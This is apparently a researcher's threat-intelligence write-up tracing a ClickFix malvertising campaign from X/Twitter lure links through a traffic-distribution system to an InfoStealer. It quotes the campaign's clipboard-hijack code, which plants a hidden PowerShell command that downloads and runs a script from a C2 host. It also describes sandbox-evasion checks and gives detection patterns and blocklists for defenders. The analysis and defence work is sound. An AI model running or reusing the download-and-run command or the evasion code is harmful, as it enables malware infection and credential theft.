# I Stumbled on a Video Site, Ended Up Uncovering a Large-Scale Malware Network

*A deep-dive into vid30s.com and vidara.to — from lure links spreading on X/Twitter all the way to InfoStealer malware stealing your passwords and crypto wallets.*

**(sudo3rs)** · June 1, 2026 · ~15 min read

`#ThreatIntelligence` `#Malware` `#ClickFix` `#ClearFake` `#InfoStealer`

---

It started with a simple observation. URLs to these "video sites" were being spread aggressively on X (Twitter) — quote-tweets, reply chains, throwaway accounts pushing links with lure text promising leaked videos and exclusive content. Classic engagement bait. The accounts posting them were either brand new or had been sitting dormant for months before suddenly becoming active link farms.

Something felt off. I decided to pull the thread.

What I found wasn't just some sketchy video hosting site. It was a structured malvertising ecosystem — complete with a Traffic Distribution System (TDS), sophisticated anti-bot fingerprinting, session tracking cookies, and an 88KB obfuscated JavaScript payload that hijacks your clipboard and socially engineers you into running a PowerShell malware dropper.

This article breaks down the full chain — from the X/Twitter distribution layer all the way down to the InfoStealer sitting at the end of it.

> *"A 2-day-old domain isn't a sign of a new business. It's a sign of churn-and-burn — use it, burn it, register a new one."*

---

## 1. How It Spreads — The X/Twitter Distribution Layer

Before getting into the technical chain, it's worth understanding how victims end up on these sites in the first place.

The distribution pattern on X follows a well-known playbook:

- **Lure accounts** — newly registered or previously dormant accounts, often with profile pictures scraped from elsewhere, posting links with enticing captions. Typical lure text involves promises of leaked videos, exclusive content, or "full versions" of viral clips.
- **Reply injection** — these accounts reply to high-engagement posts and trending topics, dropping links in threads where they'll get organic visibility.
- **Quote-tweet amplification** — some links get quote-tweeted by bot networks to boost apparent legitimacy.
- **Link shorteners and redirects** — the actual malicious domain is often hidden behind a link shortener or a redirect chain, so the URL preview on X doesn't show the real destination.

The goal of this layer is purely traffic acquisition. The affiliate operator (ID: `m2v063z8`) earns a per-install payout from the MaaS platform — every real human they send to the site who ends up running the payload is money in their pocket.

**If you saw one of these links on X and clicked it: keep reading. The section at the end tells you what to check.**

---

## 2. Target URLs Analyzed

- `https://vid30s.com/f/gjy6jel8ivk`
- `https://vid30s.com/f/i2pm2tbanki`
- `https://vid30s.com/e/gsmmhvonjif9`
- `https://vid30s.com/e/xcuyt9su302r?path=e&id=xcuyt9su302r`
- `https://vid30s.com/e/rihlsi05r9oc?path=e&id=rihlsi05r9oc`
- `https://vidara.to/e/xODacNqimf2Ey`

The `/f/` path serves as a content listing page. The `/e/` path is the player stage — this is where the malicious chain starts firing. Different path, different behavior.

---

## 3. Infrastructure — WHOIS & DNS

First thing I always do: check who registered the domain and when.

### vid30s.com

```bash
$ whois vid30s.com

Domain Name: VID30S.COM
Creation Date: 2026-05-30T04:01:59Z   # <-- 2 DAYS OLD
Updated Date: 2026-05-30T04:06:31Z
Registrar: NameCheap, Inc.
Registrant Org: Withheld for Privacy ehf (Iceland)
Name Server: JOSEPHINE.NS.CLOUDFLARE.COM
Name Server: RAY.NS.CLOUDFLARE.COM
```

### vidara.to

```bash
$ whois vidara.to

Domain Name: vidara.to
Creation Date: 2026-02-04T11:40:35Z
Registrar: NAMECHEAP
Name Server: marty.ns.cloudflare.com
Name Server: may.ns.cloudflare.com
```

Two domains, one registrar (Namecheap), both routing through Cloudflare as a reverse proxy. This is deliberate — it hides the real origin server IP and forces anyone trying to take down the site to file abuse reports in two places simultaneously. The churn-and-burn lifecycle is also visible here: vid30s.com was 2 days old at time of analysis. They register, run the campaign, then discard and spin up a new domain before it accumulates reputation.

### DNS Resolution

```bash
$ dig +short A vid30s.com
104.21.4.212
172.67.132.128

$ dig +short A vidara.to
172.67.68.241
104.26.9.94
104.26.8.94
```

All Cloudflare proxy IPs. Origin is dark. Standard operational technique to slow down takedowns and attribution.

---

## 4. Source Code Analysis — Something's Off

Curling the page source reveals two immediately suspicious elements: an extensive anti-bot telemetry script, and a heavily obfuscated JavaScript blob.

### Obfuscation Technique — Character Interleaving

The encoded string is processed using a character interleaving algorithm:

```javascript
var f = 'Chmaorr...'
  .split('')
  .reduce((_,X,V) => V%2 ? _+X : X+_)  // interleave even/odd chars
  .split('z');                           // split on delimiter
```

Characters at even and odd positions are swapped, then the result is split on `z` as a delimiter. I wrote a decoder for it. Here's what comes out:

```
// decode.js output (truncated)
['createElement', 'addEventListener', 'removeEventListener',
 'querySelector', 'querySelectorAll', 'dispatchEvent',
 'iframe', 'style', 'display', 'none', 'parentNode',
 '<iframe src="about:blank" style="display:none"></iframe>',
 'atob', 'XGI=', 'eval', 'localStorage', '_data',
 'setItem', 'getItem', 'btoa', 'navigator',
 'BroadcastChannel', 'MessageChannel', 'sessionStorage', ...]
```

Note what's in there: `eval` + `atob` + `localStorage` + a literal hidden iframe HTML string + `BroadcastChannel` + `MessageChannel`. That's a complete DOM takeover toolkit. This is not a utility library. This is weaponized.

> *"eval + atob + a hidden iframe literal in the same decoded array is the highest-signal red flag you can find in client-side JavaScript."*

---

## 5. Anti-Bot & Sandbox Evasion — They Filter for Real Humans

Before serving the main payload, the site fingerprints your environment. The checks are more sophisticated than most people expect from a "video hosting" site:

### Hardware Fingerprinting

```javascript
// GPU vendor check via WebGL
var renderer = gl.getParameter(
  gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL
);
// Abort if: 'VMware', 'VirtualBox', 'llvmpipe', 'SwiftShader'

// CPU core count
var cores = navigator.hardwareConcurrency;
// Abort if cores <= 2  (typical sandbox configuration)
```

Malware analysis sandboxes are typically configured with 1-2 CPU cores and virtual GPUs. If detected, the request chain terminates — the payload never loads.

### Behavioral Analysis — Mouse Entropy

```javascript
function calculateMouseEntropy() {
  // Records (x, y, timestamp) on each mousemove
  // Computes distribution and variance
}

function detectStraightLineMovements() {
  // Automated bots move in straight lines — efficient but unnatural
  // Computes straight_line_ratio
  // Too high = bot, abort
}
```

Tools like Puppeteer and Selenium move the cursor in perfectly straight lines between points. These functions measure the "naturalness" of cursor movement. If it's too clean, you get blocked.

### Heartbeat — They Wait for You to Stay

```javascript
function startHeartbeat() {
  setInterval(() => {
    fetch('/api/heartbeat', { keepalive: true });
  }, 15000);  // ping every 15 seconds
}
// Confirms victim is still on page before launching attack
```

The attack doesn't fire immediately. The site pings back every 15 seconds to confirm you're still there, then triggers the overlay only after you've been present for a sufficient dwell time. This avoids wasting the payload on users who bounced.

---

## 6. The Redirect Chain — How the TDS Works

Clicking play on an `/e/` page doesn't load a video. It initiates a multi-stage redirect chain:

```
Stage 1:  /e/{content_id}?path=e&id={id}
             |
             v
Stage 2:  /ip129jk?id=34676235356a39337a747969  <-- hidden iframe
             |
             v
Stage 3:  dd133.com  <-- Traffic Distribution System (TDS)
             |
             v  [passes geo, device, and bot-score filters]
             |
Stage 4:  tu.pinderecphory.com/rdESS52vpKe/121024  <-- 88KB payload
             |
             v
Stage 5:  ClickFix overlay + clipboard hijack
```

Stage 2 uses a hidden iframe injected into the DOM — the literal HTML string `<iframe src="about:blank" style="display:none"></iframe>` was sitting in the decoded array I pulled earlier. The iframe fires a `postMessage` to the TDS after the play button is clicked, with a 22-second delay (`setTimeout(sendAclck, 22000)`) to appear organic.

### The Smoking Gun — CORS Header

This was the most forensically significant finding:

```bash
$ curl -sv https://tu.pinderecphory.com/rdESS52vpKe/121024

< HTTP/2 200
< access-control-allow-origin: https://vid30s.com   # <-- HARDCODED
< content-type: application/javascript; charset=utf-8

[~88KB obfuscated JavaScript payload]
```

The server is hardcoded to whitelist `vid30s.com` as a trusted origin. This configuration cannot happen accidentally — it was deliberately set by whoever controls both `tu.pinderecphory.com` and `vid30s.com`. That's your proof of unified operational ownership, and it's exactly what goes in a takedown abuse report.

> *"A hardcoded CORS header pointing at your target domain is forensic proof of an operational relationship. That's your evidence for the abuse report."*

---

## 7. The 88KB Payload — ClickFix in Detail

The payload served from `pinderecphory.com` is an implementation of the ClickFix technique — a social engineering attack that manipulates the victim into executing a malicious command themselves, bypassing any need for a browser exploit.

### Multi-Layer Obfuscation

- IIFE wrapper: `(function(){...})()`
- String Array Shuffling — function names resolved at runtime from a rotated array
- Hex/Unicode escape sequences on critical API names to evade WAF signatures
- Base64-encoded sub-payloads decoded via `atob()` at runtime
- Anti-DevTools: monitors `console.log` overrides and `window.outerWidth` vs `innerWidth` delta

### UI Spoofing — Impersonating Trusted Brands

The payload dynamically generates CSS and DOM elements to impersonate legitimate services:

```
Template 1: Cloudflare DDoS Protection
  -> 'Verify you are human'
  -> Authority signal — users trust Cloudflare as infrastructure

Template 2: Google Chrome Critical Update
  -> 'Your browser needs an update to continue'
  -> Urgency signal — fear of being unpatched

Template 3: Video Playback Error / Fix Codec
  -> 'Codec not found, click here to fix'
  -> Functionality signal — user wants to watch the video
```

The UI is rendered with `z-index: 2147483648` — the maximum possible value — so it sits above everything else on the page. Semi-transparent overlay background: `rgba(36, 35, 35, 0.63)`.

### The Clipboard Hijack

```javascript
// Triggered on first user interaction (click or keypress)
document.addEventListener('click', () => {
  navigator.clipboard.writeText(
    'powershell.exe -w hidden -Command ' +
    '"iex (New-Object Net.WebClient)' +
    '.DownloadString(http://[C2]/payload.ps1)"'
  );
});

// Instructions displayed to the victim:
// 1. Press Windows + R
// 2. Press Ctrl + V
// 3. Press Enter
```

The victim opens the Run dialog, pastes what they think is a verification code or fix command, and hits Enter. What actually executes is a PowerShell downloader that fetches and runs the InfoStealer from the attacker's C2 server.

**No exploit. No zero-day. Pure social engineering.**

---

## 8. Session Tracking — They Know Who's Already Been Hit

```
// HTTP Response Headers — tu.pinderecphory.com
Set-Cookie: GL_UI4=eJw9...   (Base64 + Zlib-deflated)
Set-Cookie: GL_GI10=eJxj...  (Base64 + Zlib-deflated)
```

The `eJ` prefix is the Base64 encoding of zlib's deflate magic bytes (0x78 0x9C or 0x78 0xDA). These cookies store a victim device fingerprint, redirect history, and — importantly — a compromise status flag. If a victim has already been successfully attacked, the site won't re-serve the payload on subsequent visits. This prevents double-targeting the same person in quick succession, which would raise suspicion and risk detection.

> *"Mature infrastructure tracks who's already been compromised and skips re-targeting them. This is not a script kiddie operation."*

---

## 9. Campaign Identifiers — Pivot Points

```
Google Analytics ID : G-RRBBHD087X
Affiliate ID        : m2v063z8
Campaign ID         : 121024
Payload path        : /rdESS52vpKe/121024
iframe endpoint     : /ip129jk
iframeId (hex)      : 34676235356a39337a747969
```

The GA ID `G-RRBBHD087X` is pivotable via PublicWWW — searching it will surface every other site in the crawl database using the same tracking ID. Expect 100+ bait domains sharing the same infrastructure.

Affiliate ID `m2v063z8` is likely registered in the MaaS operator's panel. Forum OSINT on BreachForums, XSS.is, and Exploit.in may link this handle to payment records, additional domains, or other campaigns.

---

## 10. Likely Malware Families

The specific InfoStealer family can't be confirmed without extracting and analyzing the PowerShell payload from the C2, but based on the delivery mechanism and operator profile:

```
Lumma Stealer   [HIGH]    ClickFix is Lumma's primary delivery vector in 2025-2026.
                          MaaS model, Telegram Bot exfil, PPI affiliate payouts.

RedLine Stealer [MED]     powershell.exe -w hidden + DownloadString pattern matches
                          RedLine dropper behavior. Targets browser credentials.

Vidar Stealer   [MED]     ClickFix delivery documented in the wild. Uses Steam and
                          Mastodon posts for C2 config retrieval.

Rhadamanthys    [LOW-MED] ClearFake/ClickFix operator overlap is documented by
                          multiple vendors. Cannot exclude.
```

All of these families target the same things: browser saved passwords, session cookies, autofill data, and cryptocurrency wallet files. Many use Telegram Bot API for real-time credential exfiltration — stolen data gets sent directly to the attacker's Telegram bot as a ZIP archive.

---

## 11. MITRE ATT&CK Mapping

```
T1189     Drive-by Compromise
          Lure links spread on X/Twitter. Victims arrive voluntarily, no exploit needed.

T1059.001 PowerShell
          powershell.exe -w hidden + DownloadString via clipboard paste.
          Victim self-executes via Win+R.

T1059.007 JavaScript
          88KB obfuscated IIFE. atob/eval chain, string array shuffling.

T1027     Obfuscated Files/Information
          Character interleaving on vid30s.com.
          Multi-layer obfuscation on pinderecphory payload.

T1497.001 Virtualization/Sandbox Evasion
          WebGL GPU check, CPU core threshold, mouse entropy, DevTools detection.

T1204.002 User Execution — Malicious Clipboard
          ClickFix: Win+R -> Ctrl+V -> Enter. Pure social engineering.

T1036.005 Masquerading
          Fake Cloudflare verification, Chrome update, and video codec error pages.

T1583.001 Acquire Infrastructure — Domains
          Churn-and-burn: vid30s.com was 2 days old. NameCheap + Cloudflare.

T1539 / T1552  Steal Web Session Cookie / Unsecured Credentials
          InfoStealer targets: browser cookies, saved passwords, crypto wallets.
```

---

## 12. IOC Master List — Block These Now

| Type | Indicator |
|------|-----------|
| Domain (bait) | `vid30s.com` |
| Domain (bait) | `vidara.to` |
| Domain (bait) | `vidoy.com` |
| Domain (TDS) | `dd133.com` |
| Domain (TDS) | `js.wpadmngr.com` |
| Domain (TDS) | `jnbhi.com` |
| Domain (TDS) | `bvtpk.com` |
| Domain (TDS) | `renamereptiliantrance.com` |
| Domain (TDS) | `lr.dicconbumtrap.com` |
| Domain (TDS) | `adsco.re` |
| Domain (TDS) | `acscdn.com` |
| Domain (injector) | `tu.pinderecphory.com` |
| IP (origin, exposed) | `69.41.166.29` |
| IP (CF proxy) | `104.21.4.212` |
| IP (CF proxy) | `172.67.132.128` |
| IP (CF proxy) | `172.67.68.241` |
| GA ID | `G-RRBBHD087X` |
| Affiliate ID | `m2v063z8` |
| Campaign ID | `121024` |
| Cookie | `GL_UI4` (Base64/Zlib victim fingerprint) |
| Cookie | `GL_GI10` (Base64/Zlib compromise status) |

---

## 13. If You Clicked One of These Links

If you followed one of these URLs from X/Twitter and interacted with the page — especially if you saw a "Cloudflare verification" or "browser update" prompt asking you to press Win+R:

**1. Check if you ran anything.** Look at your PowerShell history: `Get-History` in PowerShell, or check Event Log → Windows PowerShell → Event ID 400/600 for recent executions.

**2. Check your Run dialog history.** Press Win+R and look at the dropdown — it stores recently executed commands.

**3. If you ran something, assume compromise.** Change passwords for email, banking, and any saved browser passwords immediately. Enable MFA everywhere. Check for any active sessions you don't recognize. If you have crypto wallets, consider them potentially exposed.

**4. Check your browser.** Look for unfamiliar extensions that appeared recently. These stealers often drop a browser extension as a persistence mechanism alongside credential theft.

**5. Run a scan.** Malwarebytes, HitmanPro, or your EDR of choice.

---

## 14. Next Steps for Researchers

- **CDP clipboard hook** — load the page in an instrumented Chromium instance with the Chrome DevTools Protocol active, hook `navigator.clipboard.writeText()` before page load. Fastest way to extract the raw PowerShell command without reversing 88KB of obfuscated JavaScript.
- **PassiveDNS pivot on `69.41.166.29`** — query SecurityTrails or RiskIQ. This IP hosts `pinderecphory.com` directly, no Cloudflare proxy. Should reveal sibling TDS domains on the same block.
- **PublicWWW sweep on `G-RRBBHD087X`** — one query, potentially 100+ bait domains using the same Google Analytics ID.
- **Cookie decode** — Base64-decode then zlib-decompress `GL_UI4` and `GL_GI10`. The `eJ` prefix is the zlib magic bytes. Extract the victim profile schema and compromise flag logic.
- **Forum OSINT on `m2v063z8`** — search BreachForums, XSS.is, Exploit.in for the affiliate handle.
- **Campaign ID correlation (`121024`)** — cross-reference in ThreatFox, OTX AlienVault, and vendor threat reports to link to previously documented ClickFix/ClearFake operations.

---

## 15. For SOC / Blue Teams

- Block all IOC domains at DNS resolver, NGFW, and web proxy level.
- Deploy EDR detection: alert on `powershell.exe -w hidden` or `-WindowStyle Hidden` spawned from `explorer.exe` or `cmd.exe` where commandline contains `DownloadString`, `iex`, or `Invoke-Expression` with a remote URI.
- Submit takedown requests to `abuse@namecheap.com` and `https://abuse.cloudflare.com`. Include the CORS header evidence linking `vid30s.com` to `tu.pinderecphory.com` — that's the clearest proof of malicious intent.
- User awareness communication: **No legitimate service — not Cloudflare, not Google, not any video platform — will ever instruct you to open the Run dialog and paste something into it.** If you see that instruction, close the tab.

---

## Closing

What's technically impressive about this operation — in a grudging, adversarial kind of way — is how complete it is. This isn't someone's weekend project. It's a MaaS affiliate ecosystem with a traffic acquisition layer (X/Twitter lure accounts), a filtration layer (TDS + anti-bot), a delivery layer (ClickFix + clipboard hijack), and a payload layer (InfoStealer). Each layer is specialized and they interlock cleanly.

The X/Twitter distribution adds a human amplification component that pure SEO campaigns don't have. Lure accounts get retweeted, replied to, and shared — victims arrive pre-convinced that the content is real because they got the link from a tweet that had engagement. Social proof as an attack vector.

`vid30s.com` and `vidara.to` are just the visible surface. Behind them sits a TDS network, injector infrastructure, and likely hundreds of other bait domains cycling through the same affiliate system.

All of this started with a 2-day-old domain that looked slightly off.

> *"Sometimes the most valuable threat hunts start with a simple instinct: why is this domain so new?"*

If you find overlapping IOCs or have findings from the same infrastructure, I'm open to comparing notes.

— (sudo3rs)
 | June 1, 2026

---

`#ThreatIntelligence` `#Malware` `#ClickFix` `#ClearFake` `#InfoStealer` `#Malvertising` `#MITRE` `#LummaStealer` `#CyberSecurity` `#Twitter` `#SocialEngineering`
